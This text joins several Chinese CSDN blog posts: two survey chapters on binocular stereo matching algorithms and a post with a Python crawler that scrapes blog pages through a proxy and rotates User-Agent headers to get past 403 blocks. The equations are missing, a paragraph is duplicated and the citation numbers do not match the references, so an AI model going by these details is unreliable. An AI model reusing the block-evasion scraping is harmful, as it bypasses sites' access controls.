一门功课、一个课后作业、一次跟导师合作的项目机会，只要我们从中有所收获，都可以为视为经验； 









转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51531333，
来自：
shiter编写程序的艺术

文章大纲2.1 视差理论2.2 立体匹配约束2.2.1 极线约束2.2.2 相容性约束2.2.3 唯一性约束2.2.4连续性约束2.3 立体匹配方法2.3.1 局部匹配算法2.3.2 全局优化匹配算法2.4 遮挡2.5遮挡检测方法2.6立体匹配的评价方法参考文献

2.1 视差理论
计算机立体视觉系统通过模仿人类的的视觉系统，根据对同一场景从不同位置拍摄的两视角或多视角图像，采用几何方法可以计算出深度信息。本文主要研究的双目立体视觉系统如下图所示

双相机系统
在相似三角形和中根据对应边的比例关系：

其中Z为场景的深度，b为相机基线之间的距离，f为相机焦距。且由于bf/Z
为正数，根据上式有xl>xr，由此极大简化了匹配算法。一般算法中，垂直方向上的视差采用标准的立体相机系统，即针对已经在水平方向上矫正了的图像。垂直方向上的视差为0。
2.2 立体匹配约束
由于立体匹配是从二维图像中恢复三维信息，其本身具有不确定性的特征，因此为了获取正确的匹配结果，需要借助各种约束信息来降低匹配的搜索难度，提高匹配的准确度。常用的约束信息有以下几种。
2.2.1 极线约束
由一个三维点和它在两相机成像平面的点构成的平面包含基线，即连接两个相机中心和连接两个极线直线构成的平面，该平面被称为极平面。图中P点及其投射点Or和Ol构成极平面，极平面与相机成像平面交线为极线。空间点P在成像平面上的投影点pl以及pr位于相应的极线上。
极线约束将搜索图像点的问题在立体匹配领域由二维搜索问题降低为一维搜索问题，极大简化了问题复杂度。在标准的立体视觉系统中，极线与图像的扫面线共线。

2.2.2 相容性约束
相容性约束也称为一致性约束，它要求在待匹配的两幅图像中，对应区域的特征值差别在给定阀值之内或者对应的特征点应具有相同的属性。在判断待匹配图像中的两个基元是否具有相容性约束时，可以选择的特征有以下三类：
1．像素特征，如灰度值等
2．光照特征
3．几何特征（质心，形状，边界，轮廓）
2.2.3 唯一性约束
唯一性约束要求对于待匹配图像，在原图像中至多对应一个点。该约束简化了匹配过程。一幅图像上的每个基元只能与另一幅图像上的唯一一个基元相对应，这样图像中的每个匹配基元最多只能有一个视差值
2.2.4连续性约束

2.3 立体匹配方法
在立体匹配中，匹配问题可以被看成寻找两组数据相关程度的过程[3]。立体匹配方法有多种分类，本领域内对于匹配算法的经典划分方法为两组层次结构：
局部匹配算法和全局匹配算法。
其划分依据是基于算法运行时约束的作用范围。另外一种划分是基于生成的视差图。对于所有像素都能生成确定视差值的称为稠密视差图，该类方法成为稠密匹配该种方法应用广泛，例如图像合成等。
另一方面，与稠密视差图对应的是稀疏视差图，称为稀疏匹配，其只对被选择的像素点（通常为角点或者边缘点）有视差值，此类方法计算速度快，但需要后期通过插值算法处理缺失的视差值，所以应用场景有很大限制。本文主要针对经典的划分介绍立体匹配算法。
2.3.1 局部匹配算法
基于局部区域约束的匹配算法利用给定位置周围的局部信息进行计算，涉及信息量较少，计算复杂度较低，大多实时性平台借鉴了此算法的思想。但其对无纹理、视差不连续和遮挡区域匹配效果不理想。局部算法一般可以分为两类：特征匹配算法，区域匹配算法。

（1）特征匹配
该类方法首先从待匹配图像中提取特征，用相似性度量和一些约束条件确定几何变换，最后将该变换作用于待匹配图像。这类方法主要包括特征提取、特征匹配、模型变换、插值与视差求精等几个步骤。
特征匹配算法是根据待匹配图像中的特征：灰度变化，边缘，光照等，建立其对应关系，并根据插值算法得到视差图的过程。特征匹配对图像噪声，遮挡不敏感，运算量小且计算时间短，但只能获取稀疏的视差图，在插值运算时容易丧失精度，对低纹理区域的匹配效果不好。
（2）区域匹配
该类方法使用匹配窗，对所有子区域匹配窗口进行相似性度量来确定对应的区域。区域匹配中有两个问题很重要，一是相似性准则的选取，一是窗口的选取。一些常用的区域匹配相关准则有：


其中互相关度量和归一化互相关度量的值越大说明相似度越高，其余的值越小说明相似度越高。在窗口选择方面，影响匹配效果的关键性因素是匹配窗口的大小，窗口过小就不能包含足够的亮度信息，使亮度变化与图像噪声的比值很小，使得误匹配率升高；窗口过大，则对视差边缘不能很好的体现，且计算量升高，同时匹配效果也有所降低。

2.3.2 全局优化匹配算法
图像问题的求解可以看成是马尔科夫随机场框架下的最大后验概率求解，并进一步转换为能量最小化问题的求解。全局匹配方法首先构造一个能量函数，其形式一般为
，
其中数据项描述了匹配程度，平滑项体现了定义场景的约束，动态规划(DP)、置信扩展(BP)、图割(GC)、模拟退火(SA)、扫描线优化(SO)、协作算法(CA)等优化算法都可以作为求解能量最小化的方法。其中动态规划、置信扩展和图割是最常用的方法。

（1）动态规划
该类方法利用每条扫描线上的顺序性约束将匹配的能量函数看作是从扫描线的起点到终点的最小代价路程问题。最优路径的代价是所有子路径代价之和，这些子路径所经过的点的匹配代价可以由区域相关度量算子来决定。
动态规划算法将问题分解为多个阶段决策进行。

多个阶段互相联系并做出决策，从而使整个过程能量最优。通过在规划平面上搜索最佳路径得到最优的匹配。动态规划在一维优化中能够达到全局最优，但又因为它是在扫描线上进行匹配，使得它在扫描行之间存在严重的拖尾现象。
由于动态规划得到的是每条极线的最佳匹配而没有考虑极线与极线之间的约束关系，人们加入了极线间约束来得到极线间能量函数的最小值。与其他优化方法相比,动态规划的优点在于它为那些缺乏纹理而容易产生误匹配的区域提供了全局约束，解决了这些区域由于不同视差下的局部能量值都很低而难以匹配的问题。对于遮挡问题,动态规划中一般都将遮挡部分的能量用一个固定的值来代替,然后利用一致性约束来检测遮挡。动态规划方法的缺点是错误匹配可能沿核线方向扩展而导致其他正确匹配的失败，因此利用动态规划方法得到的视差图上经常有条纹出现。

（2）置信扩展
置信扩展算法最早在1988年由Pearl提出，1999年以后它被广泛应用于计算机视觉的各个领域来解决具有环的图结构的优化问题并得到了不错的结果。该算法对于没有环的图结构可以收敛到最优解，但对于有环的图结构不能保证收敛到最优解。目前该算法的研究重点是如何提高算法的效率。

Sun等[25]在2003年将置信扩展算法应用到立体匹配中并取得了很好的结果，2005年，Sun等又在算法中加入了可见性约束来检测遮挡现象。Felzenszwalb等[26]提出了层次置信扩展算法，从多个方面提高了置信扩展算法的速度。yang等[38]利用层次置信扩展算法实现了遮挡了检测。Tappen和Freemanl[28]分别用图割和置信扩展对同样参数的Potts模型马尔可夫随机场进行优化，结论是置信扩展比图割的结果更平滑，速度也比图割快，但能量高于图割，两者的效果是相当的。

（3）图割[8][9][23][24]
近年来，随着图的优化算法在计算机视觉中的应用，基于图割的能量函数的最小化问题受到了很大的关注。Roy[18]最早将图割算法应用于立体匹配，并通过实验表明，图割算法能有效克服其他全局优化算法的缺点（如动态规划算法等生成视差图产生的横向条纹瑕疵），避免了视差在临近极线处不连续的问题。但该算法生成的视差图轮廓边缘模糊，视差层的区分度低。

Boykov与Kolmogorov[15]利用特定约束构造能量函数，并通过改进的最大流方法进行能量函数的最小化，将该图割算法应用于立体匹配问题，取得了效果良好的致密视差图。（并且证明了图割方法在能量最小化时候取得的最小值和全局最小值相差一个已知常数）但该方法构建网络图时生成了大量节点，导致空间复杂度较高，同时，该算法运算过程需要多次迭代，时间复杂度高，无法达到实时计算的要求。为了提高匹配速度Li[19]提出基于无重叠视差区域分割的立体匹配，并用分割块的能量最小化取代了常用图割算法像素级的能量最小化，降低了算法的时间复杂度，但生成的视差图边缘处有毛刺现象。
Bleyer[20]等人利用图像在每个分割块中的视差具有光滑性的特点，提出了基于图像分割的立体匹配算法的通用算法。但该方法无法得到像素级的最优分配，且复杂度高，计算量大。Bleyer与Rother[21]针对现有采用基于低尺度分割，将图像分割成超像素形式从而减少图割算法生成节点的立体匹配方法。假设相同物体具有紧凑、连接并且物体表面视差变化平滑等特性，提出了一种新的基于物体分割的立体匹配方法。该方法虽然在物体分割与视差获取上效果良好，但是运算量大，对于物体和背景的内部区域缺少纹理的深度信息，并且物体间的区域没有准确的视差标注。
上述文献中基于图像分割的立体匹配方法，由于采用自动化非交互的彩色图像分割方法会把相同视差的区域分开或隐去了图像的部分细节信息，导致分割误差，而消除误差需要引入其他方法，如通过引入初试视差估计[20][21]等方法，但这些方法增加了立体匹配算法的整体复杂度，而且没有有效利用分割信息。在实际应用场景中为了获取感兴趣区域的精细视差图，针对于以往基于图像分割的立体匹配算法复杂、计算量大，没有充分利用分割结果的信息等缺点，提出了一种基于交互式图像分割的立体匹配方法。该方法在图像分割时采用可交互的图割方法获得感兴趣目标，只针对感兴趣目标进行立体匹配，因此运算量大大减少，同时保留了原有图割算法具有的全局最优特性。
2.4 遮挡
立体匹配中存在的不可见问题是由于场景的几何结构和场景中物体的遮挡。所谓遮挡是指由于场景中的景物与摄像机之间的相互位置关系所导致的场景中的某些点在一个摄像机中可见，而在另外一个摄像机中不可见的情况。由于景物深度不同，距离摄像机较远的景物就可能被距离摄像机较近的景物遮挡，从而不能形成图像而且，由于视点的变化，景物的遮挡区域可能发生变化，某一视点下可见的场景区域在另一个视点下可能成为遮挡区域，这种现象称为半遮挡现象。
计算机视觉中研究的遮挡现象几乎都属于半遮挡现象。遮挡问题的非双目可见性以及伴随的表面不连续性，使它不满足立体视觉的一些约束的要求，是立体视觉研究中的一个难点和重点所在近年来，人们对遮挡区域的检测和测量，乃至恢复遮挡区域的正确深度估计等方向进行了大量的研究，提出了若干遮挡问题的解决方案。
在实际的匹配系统中，为了克服遮挡问题，需要针对遮挡点进行深度插值运算。
2.5遮挡检测方法
交叉检查=左右检查LRC（在有低空间频率结构的场景中结果较差）
点顺序约束（ORD）
如果在两幅图像中，匹配点的顺序不同，那么在场景中的匹配点就是遮挡点。（整体有最低的误判率和最低的触发率）
遮挡约束（OCC）
假设视差图中的不连续区为遮挡区，所以，要找到遮挡区域，只需要找到视差图中的不连续区域。这个过程执行两次：一次是用左图像作为参考，另一次用右图像作为参考。
2.6立体匹配的评价方法
错误匹配率的定义如下[3]：

其中，为整个图像的像素数，为计算出的视差图，为真实的视差图，在比对中，标准的真实视差图只取跟分割模板相同的部分，其余全部设置为背景，为误差容许值，一般情况下对于正整数范围内的视差标注取1。
参考文献
[1]白明, 庄严, 王伟. 双目立体匹配算法的研究与进展[J]. 控制与决策, 2008, 23(7):721-729. DOI:doi:10.3321/j.issn:1001-0920.2008.07.001.
[2]赛干内克. 三维计算机视觉技术和算法导论[M]// 国防工业出版社, 2014.
[3]Cyganek B, Siebert J. An Introduction to 3D Computer Vision Techniques and Algorithms[J]., 2009.
[4]尹传历, 刘冬梅, 宋建中. 改进的基于图像分割的立体匹配算法[J]. 计算机辅助设计与图形学学报, 2008, 第6期(6):808-812.
[5]王保丰, 周建亮, 唐歌实,等. 嫦娥三号巡视器视觉定位方法[J]. 中国科学：信息科学, 2014, 04期(04):452-460.
[6]尹传历, 刘冬梅, 宋建中. 改进的基于图像分割的立体匹配算法[J]. 计算机辅助设计与图形学学报, 2008, 20(6):808-812.
[7]朱代先. 基于双目视觉的工件定位与抓取研究[J]. 计算机测量与控制, 2015, 19(1):92-94.
[8]顾骋, 钱惟贤, 陈钱,等. 基于双目立体视觉的快速人头检测方法[J]. 中国激光, 2014, 01期(01):150-155.
[9]朱素杰, 周波, 刘忠艳. 一种基于相位的立体匹配算法[J]. 工业仪表与自动化装置, 2013, 第2期(02):101-104.
[10]Yang Q. A non-local cost aggregation method for stereo matching[C]// Proceedings / CVPR, IEEE Computer Society Conference on Computer Vision and Pattern Recognition. IEEE Computer Society Conference on Computer Vision and Pattern Recognition. 2012:1402-1409.
[11]Yang Q, Ji P, Li D, et al. Fast stereo matching using adaptive guided filtering[J]. Image and Vision Computing, 2014, 32(3): 202-211.
[12]Yang Q. Hardware-efficient bilateral filtering for stereo matching[J]. Pattern Analysis and Machine Intelligence, IEEE Transactions on, 2014, 36(5): 1026-1032.
[13]Yang Q. Stereo Matching Using Tree Filtering[J]. Pattern Analysis & Machine Intelligence IEEE Transactions on, 2015, 37(4):834-846.
[14]Geiger A, Roser M, Urtasun R. Efficient large-scale stereo matching[M]//Computer Vision–ACCV 2010. Springer Berlin Heidelberg, 2011: 25-38.
[15]Boykov Y, Kolmogorov V. An experimental comparison of min-cut/max-flow algorithms for energy minimization in vision[J]. IEEE Transactions on Pattern Analysis and Machine Intelligence, 2004, 26(9): 1124-1137.
[16]Bleyer M, Gelautz M. Graph-cut-based stereo matching using image segmentation with symmetrical treatment of occlusions[J]. Signal Processing: Image Communication, 2007, 22(2): 127-143.
[17]Bleyer M, Rother C, Kohli P, et al. Object stereo-joint stereo matching and object segmentation[A]// IEEE Conference on Computer Vision and Pattern Recognition[C], 2011 June 21-23, Colorado, USA :3081-3088.
[18]Roy S, Cox I J. A maximum-flow formulation of the n-camera stereo correspondence problem[A]// IEEE International Conference on Computer Vision[A], 1998 January 4-7, Bombay India:492-499.
[19]Hong L, Chen G. Segment-based stereo matching using graph cuts[A]// IEEE Conference on Computer Vision and Pattern Recognition[C],2004 June 27-July 2,Washington DC USA:74-81.
[20]Bleyer M, Gelautz M. Graph-cut-based stereo matching using image segmentation with symmetrical treatment of occlusions[J]. Signal Processing: Image Communication, 2007, 22(2): 127-143.
[21]Bleyer M, Rother C, Kohli P, et al. Object stereo-joint stereo matching and object segmentation[A]// IEEE Conference on Computer Vision and Pattern Recognition[C], 2011 June 21-23, Colorado, USA :3081-3088.
[22]Tang M, Gorelick L, Veksler O, et al. GrabCut in One Cut[A]// IEEE International Conference on Computer Vision[C], 2013 Dec 01 - 08, Sydney, Australia  1769-1776.
[23]王年, 范益政, 鲍文霞等. 基于图割的图像匹配算法[J]. 电子学报, 2006, 34(2):232-236.
#论文资源合集

立体匹配综合论文集 :   http://download.csdn.net/detail/wangyaninglm/9591251
基于图像分割的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591253
并行立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591255
基于置信传播的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591256
基于稠密匹配的论文合集：   http://download.csdn.net/detail/wangyaninglm/9591259

转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51531333，
来自：
shiter编写程序的艺术










转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51533549， 
来自： 
shiter编写程序的艺术
计算机视觉是一门研究使用计算机来模拟人的视觉系统的学科。“一图胜千言”，人类对于图像中的信息感知效率远超文字等其他媒介，人类获取的信息总量中更是有高达80%依靠视觉系统[1]。相对于人类高效的图像信息提取能力，计算机在图像信息的理解上仍然效率低下。 
计算机视觉作为一门交叉学科，综合了生物学，心理学，数学，计算机科学等学科，从20世纪60年代至今其在科学研究领域中的大量成果已经应用于工程领域，并影响了我们每个人生活的方方面面。 
双目立体视觉是计算机视觉领域的重要分支，它通过模拟人的视觉系统来处理现实世界。以机器人，无人汽车导航为例，由于双目立体匹配在非接触测量中的优秀性能，视觉测量在探月工程，火星探测工程中起到了重要作用[2]，如图所示的我国嫦娥探月工程的巡航车就配备了立体视觉导航系统，来进行行进间的运动控制和路径规划[3]。 

1.1 研究背景与意义
立体匹配是一种从平面图像中恢复深度信息的技术。由于双目立体匹配系统通过模拟人眼视觉感知原理，仅需要两台数字摄像机安装在同一水平线上，经过立体矫正就可以投入使用。具有实现简单，成本低廉，并且可以在非接触条件下测量距离等优点。在机器人制导系统中可以用于导航判断、目标拾取，在工业自动化控制系统中可用于零部件安装、质量检测，环境检测，在安防监控系统中可用于人流检测，危害报警。 

近年来，随着社会的科技进步，立体匹配技术的发展日新月异，随着匹配算法精度与速度的提高，其应用场景进一步扩大。在此背景下，研究立体匹配变的意义非凡。 
立体匹配作为三维重建、立体导航、非接触测距等技术的关键步骤通过匹配两幅或者多幅图像来获取深度信息。并且广泛应用于，工业生产自动化、流水线控制、无人驾驶汽车（测距，导航）、安防监控、遥感图像分析、机器人智能控制等方面。虽然立体匹配应用广泛但是还有很多尚未解决的难题因此该技术成为了近年来计算机视觉领域广泛关注的难点和热点。 
立体匹配作为一种工程化问题，在实施过程中有多种因素影响其精度与速度，并没有一种复杂算法可以完整的处理立体匹配的整个流程，本文所述算法主要针对立体匹配中图像像素匹配并计算视差这一核心步骤。
通常根据立体匹配算法所采用的约束，可以将其分为两大类算法[5]： 
 
第一类为基于区域约束的局部匹配算法。如采用匹配窗的代价聚合算法（平方差算法SSD，绝对差算法SAD，归一化算法NCC等）；采用特征点的匹配算法；采用相位匹配的的匹配算法。这些算法的优点是运算速度快，能够快速恢复出纹理丰富区域的视差。缺点是在低纹理区域会造成误匹配[6]，得到的视差图不致密，需要在后期通过插值算法来进行修正。 
第二类为基于全局约束的优化算法，如图割算法(Graph Cuts, GC)，人工智能算法（神经网络，遗传算法），置信传播算法(Belief Propagation, BP)，动态规划算法(Dynamic Programming, DP)。这些算法虽然运算时间较长并且会产生一些误匹配，但是基本上能够获得所有的视差信息从而生成稠密的视差图。
1.2 国内外研究现状
国外在计算机立体视觉上的研究开展较早，Roy[7]最早将图割算法应用于立体匹配，并通过实验表明，图割算法能有效克服其他全局优化算法的缺点（如动态规划算法等生成视差图产生的横向条纹瑕疵），避免了视差在临近极线处不连续的问题。但该算法生成的视差图轮廓边缘模糊，视差层的区分度低。Geiger等[8]，针对高分辨率图像立体匹配运算时间长的问题，创造性的提出了使用强约束点（纹理或特征信息较为丰富）作为支撑点，在强约束点之间通过三角剖分对视差图进行插值计算，结合OpenMP技术在通用CPU上实现了并行计算，操作简单易于搭建环境，在通用微型计算机上实现了实时立体匹配，但是匹配效果和基于全局优化的匹配算法有一定差距。 
 
国内对于立体视觉的研究起步较晚，早期主要采用基于特征点匹配的方法，随着技术的进步，后序对立体匹配的改进工作主要集中在对全局优化算法性能和准确度的提升上。其中大部分方法采用对待匹配图像进行图像分割后，再结合能量最优化的方法进行立体匹配。如尹等[9]采用均值平移算法将参考图像根据颜色信息快速聚类；之后计算初始视差图；将分割结果作为能量视差函数的一个参考项；最后采用图割算法求取使全局能量最小的视差最优分配。此种基于图像分割的立体匹配方法的理论基础认为，分割区域块内的视差变化是平滑的。因此与其他基于图像分割的立体匹配算法相比，此类算法[9]可有效地处理大块低纹理区域，匹配精度高，更有利于估计视差图的边界。并且上述算法通过分割减少了匹配基元，使得运算速度更快，能够很好的解决的边界模糊和低纹理区域的误匹配问题。 
 
立体匹配技术的应用十分广泛，王等[6]改进了勇气号机遇号火星车复杂的定位技术，在嫦娥3号月面巡航器的视觉导航系统中，将SIFT(scale-invariant feature transform) 匹配、相关系数匹配、最小二乘匹配和光束法平差等多项技术融合, 实现了相邻站间月面巡视器的导航定位. 实验表明视觉定位相对精度优于4%。 
朱[8]针对工件的自动定位、识别与抓取等问题，使用立体视觉的方法进行工件识别的定位；对图像就行SIFT特征提取，并采用模板匹配方法实现工件的识别。用形态学方法获得工件特征点的二维信息,结合双目立体视觉标定技术得到工件的三维坐标，为机器人抓取工件提供信息。 
顾等[9]为实现统计实时人流，提出一种基于立体视觉的人头检测算法。该方法对双目相机采集的图像通过运动目标检测分离出运动人员所在区域，利用视差的连续性只对强纹理点进行绝对误差累积(SAD)匹配，其余点只进视差验证，因此能够得到稠密的视差图，再由三角投影关系计算出深度图。由于双目立体成像得到的深度图中人员与场景的深度分布不同，采用深度分层的方法将存在人头信息的深度层提取出来，并通过几何形态来确定人头，该算法可以很好地适应复杂场景下的人头检测，精度高、速度快。 
 
Yang等[11]，提出了采用全局最小生成树的代价聚合方案，像素间的相似性作为边的权值，通过无向连通图构建最小生成树，使得局部像素点获取了全局的信息。解决了低纹理区域的误匹配问题。（实际为对局部窗匹配算法的改进。），针对采集的待匹配图像可能带有噪声或者复杂纹理的问题，该团队进行了系统化流程的设计改进[14]。
顾等[11]为实现统计实时人流，提出一种基于立体视觉的人头检测算法。该方法对双目相机采集的图像通过运动目标检测分离出运动人员所在区域，利用视差的连续性只对强纹理点进行绝对误差累积(SAD)匹配，其余点只进行视差验证，因此能够得到稠密的视差图，再由三角投影关系计算出深度图。由于双目立体成像得到的深度图中人员与场景的深度分布不同，采用深度分层的方法将存在人头信息的深度层提取出来，并通过几何形态来确定人的头部，该算法可以很好地适应复杂场景下的人头检测，并且由于采用了基于局部优化的匹配算法结合插值计算等手段所以其在精度、速度上都有很好的实时特性。
Yang等[12]，提出了基于最小生成树的代价聚合方案，采用像素间的相似性作为边的权值，通过无向连通图构建最小生成树，使得局部像素点获取了全局的信息。解决了低纹理区域的误匹配问题。针对采集的待匹配图像可能带有噪声或者复杂纹理的问题，Yang等在上述算法的基础上进行了系统化的流程设计与改进[13]，利用左右交叉检验精确更新代价聚合中稳定和不稳定的点的代价，提升了算法精度。 
立体匹配算法的改进，近年来主要围绕如何快速获取稠密视差图以及将匹配算法并行化，Yang等[12][13]，利用保边滤波器的性质并加以改进，融合并行计算技术，分别用导向滤波器和双边滤波器，针对局部匹配算法和全局匹配算法提出了工程化系统化的立体匹配并行流程方法。 

ppt下载：立体匹配基础
参考文献
[1]马颂德,张正友. 计算机视觉—计算理论与算法基础[M].北京:科学出版社,1997. 
[2]邸凯昌. 勇气号和机遇号火星车定位方法评述[J]. 航天器工程, 2009, 18(5):1-5. 
[3]吴伟仁, 王大轶, 邢琰,等. 月球车巡视探测的双目视觉里程算法与实验研究[J]. 中国科学:信息科学, 2011(12):1415-1422. 
[4]王保丰, 周建亮, 唐歌实,等. 嫦娥三号巡视器视觉定位方法[J]. 中国科学：信息科学, 2014, 04期(04):452-460. 
[5]白明, 庄严, 王伟. 双目立体匹配算法的研究与进展[J]. 控制与决策, 2008, 23(7):721-729. DOI:doi:10.3321/j.issn:1001-0920.2008.07.001. 
[6]张令涛, 曲道奎, 徐方. 一种基于图割的改进立体匹配算法[J]. 机器人, 2010, 32(1):104-108. 
[7]Roy S, Cox I J. A maximum-flow formulation of the n-camera stereo correspondence problem[A]// IEEE International Conference on Computer Vision[A], 1998 January 4-7, Bombay India:492-499. 
[8]Geiger A, Roser M, Urtasun R. Efficient large-scale stereo matching[M]//Computer Vision–ACCV 2010. Springer Berlin Heidelberg, 2011: 25-38. 
[9]尹传历, 刘冬梅, 宋建中. 改进的基于图像分割的立体匹配算法[J]. 计算机辅助设计与图形学学报, 2008, 20(6):808-812. 
[10]朱代先. 基于双目视觉的工件定位与抓取研究[J]. 计算机测量与控制, 2015, 19(1):92-94. 
[11]顾骋, 钱惟贤, 陈钱,等. 基于双目立体视觉的快速人头检测方法[J]. 中国激光, 2014, 01期(01):150-155. 
[12]Yang Q. A non-local cost aggregation method for stereo matching[C]// Proceedings / CVPR, IEEE Computer Society Conference on Computer Vision and Pattern Recognition. IEEE Computer Society Conference on Computer Vision and Pattern Recognition. 2012:1402-1409. 
[13]Yang Q. Stereo Matching Using Tree Filtering[J]. Pattern Analysis & Machine Intelligence IEEE Transactions on, 2015, 37(4):834-846. 
[14]Yang Q. Hardware-efficient bilateral filtering for stereo matching[J]. Pattern Analysis and Machine Intelligence, IEEE Transactions on, 2014, 36(5): 1026-1032. 
[15]Yang Q, Li D, Wang L, et al. Full-Image Guided Filtering for Fast Stereo Matching[J]. IEEE Signal Processing Letters, 2013, 20(3):237-240. 
[16]Yang Q, Ji P, Li D, et al. Fast stereo matching using adaptive guided filtering[J]. Image and Vision Computing, 2014, 32(3): 202-211.
论文资源合集

立体匹配综合论文集 :   http://download.csdn.net/detail/wangyaninglm/9591251
基于图像分割的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591253
并行立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591255
基于置信传播的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591256
基于稠密匹配的论文合集：   http://download.csdn.net/detail/wangyaninglm/9591259

转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51533549， 
来自： 
shiter编写程序的艺术 







                  					
														



目录近期听课的思考语料库的记录3种爬虫urllib.request + BeautifulSoupscrapy 与xpath使用selenium 模拟浏览器行为新的改变相关链接未完待续
近期听课的思考
近期有机会听了听天善智能的课程《自然语言处理之AI深度学习顶级实战课程》慢慢的有一些心得，以后有机会慢慢给大家分享出来。
为什么微软称NLP 为人工智能“皇冠上的明珠”？----认知智能
深度学习在自然语言处理的通用步骤

论文的阅读，最新算法的研究
算法的大概方向的评估训练和确定
训练数据的收集，清洗以及数据的预处理
算法实现，系统设计，参数调优，模型升级
模型效果评估与部署

语料库的记录
其实对于很多公司来说，要做NLP的一个最大的问题就是语料库的积累，包括词向量，知识库等等。这些东西最好的来源是什么呢？–爬虫。
爬虫最常用的三种手段：
1.urllib.request
构造页面post 请求
2.scrapy
如果有非常详细的 网站树形结构，使用该框架爬取非常快捷方便
3.selenium
自动化测试利器，针对动态请求，url没有变化的网站类型有奇特疗效
以下分别针对上述三种爬取方式给出实例代码
3种爬虫
urllib.request + BeautifulSoup
主要思路，遍历分页列表–>获取每一页的博客链接–>依次爬取博客内容
# encoding: utf-8
'''
@author: season
@contact: 

@file: spider_for_csdn.py
@time: 2018/10/16 21:32
@desc:
'''
import io
import os
import sys
import urllib
from urllib.request import urlopen
from urllib import request
from bs4 import BeautifulSoup
import datetime
import random
import re
import requests
import socket

socket.setdefaulttimeout(5000)  # 设置全局超时函数

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='gb18030')
headers1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'}
headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36'}
headers3 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}

# 得到CSDN博客某一个分页的所有文章的链接
articles = set()


def getArticleLinks(pageUrl):
    # 设置代理IP
    # 代理IP可以上http://ip.zdaye.com/获取，此处不应该硬编码
    proxy_handler = urllib.request.ProxyHandler({'post': '49.51.195.24:1080'})
    proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
    opener = urllib.request.build_opener(urllib.request.HTTPHandler, proxy_handler)
    urllib.request.install_opener(opener)
    # 获取网页信息
    req = request.Request(pageUrl, headers=headers1 or headers2 or headers3)
    html = urlopen(req)
    bsObj = BeautifulSoup(html.read(), "html.parser")
    global articles
 # 正则表达式匹配每一篇文章链接(比较硬编码h4 这个四级标题里面藏了所有链接)
    for articlelist in bsObj.findAll("h4"): 
        # print(articlelist)
        if 'href' in articlelist.a.attrs:
            if articlelist.a.attrs["href"] not in articles:
                # 遇到了新界面
                newArticle = articlelist.a.attrs["href"]
                # print(newArticle)
                articles.add(newArticle)
                #print(newArticle)


# 得到CSDN博客某个博客主页上所有分页的链接，根据分页链接得到每一篇文章的链接并爬取博客每篇文章的文字
pages = set()


def getPageLinks(bokezhuye):
    # 设置代理IP
    # 代理IP可以上http://ip.zdaye.com/获取
    proxy_handler = urllib.request.ProxyHandler({'post': '49.51.195.24:1080'})
    proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
    opener = urllib.request.build_opener(urllib.request.HTTPHandler, proxy_handler)
    urllib.request.install_opener(opener)
    # 获取网页信息
    req = request.Request(bokezhuye, headers=headers1 or headers2 or headers3)
    html = urlopen(req)
    bsObj = BeautifulSoup(html.read(), "html.parser")
    # 获取当前页面(第一页)的所有文章的链接
    getArticleLinks(bokezhuye)
    # 去除重复的链接
    global pages
    for pagelist in bsObj.findAll("a", href=re.compile("^/([A-Za-z0-9]+)(/article)(/list)(/[0-9]+)*$")):  # 正则表达式匹配分页的链接
        if 'href' in pagelist.attrs:
            if pagelist.attrs["href"] not in pages:
                # 遇到了新的界面
                newPage = pagelist.attrs["href"]
                # print(newPage)
                pages.add(newPage)
                # 获取接下来的每一个页面上的每一篇文章的链接
                newPageLink = "http://blog.csdn.net/" + newPage
                getArticleLinks(newPageLink)
                # 爬取每一篇文章的文字内容
                for articlelist in articles:
                    newarticlelist = "http://blog.csdn.net/" + articlelist
                    print(newarticlelist)
                    getArticleText(newarticlelist)



####获取到每一个分页列表的所有文章
str_page_url_prefix = 'https://blog.csdn.net/wangyaninglm/'

list_page_str = str_page_url_prefix + 'article/list/'

#输入分页数据量,我的博客17页
for i in range(1,18):
    getPageLinks(list_page_str+ str(i))

page_url_list = []
page_url_pattern = "(" + str_page_url_prefix + "article/details)(/[0-9]+)*$"

# 把不符合的格式链接去除
for page_link in articles:

    if re.match(page_url_pattern,page_link):
        page_url_list.append(page_link)
    else:
        pass


print(len(page_url_list))

dict_page_content = {'title':'','content':''}
list_page_content = []

import spider_for_403

for url in page_url_list:
    spider_for_403.get_Content(url,'blog-content-box','title-article','article_content')



在爬取的过程中发现403报错，于是写了下面文件，更多的浏览器头
import urllib
import urllib.request
import random
from bs4 import BeautifulSoup

import urllib.error

my_headers = [
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)"
]

import re

#windows 创建文件替换特殊字符
def validateTitle(title):
    rstr = r"[\/\\\:\*\?\"\<\>\|]"  # '/ \ : * ? " < > |'
    new_title = re.sub(rstr, "_", title)  # 替换为下划线
    return new_title.replace('\r','').replace('\n','').replace('\t','')

#csdn 的网页解析
def get_Content(url,contend_box_id,title_id,contend_id):
    try:
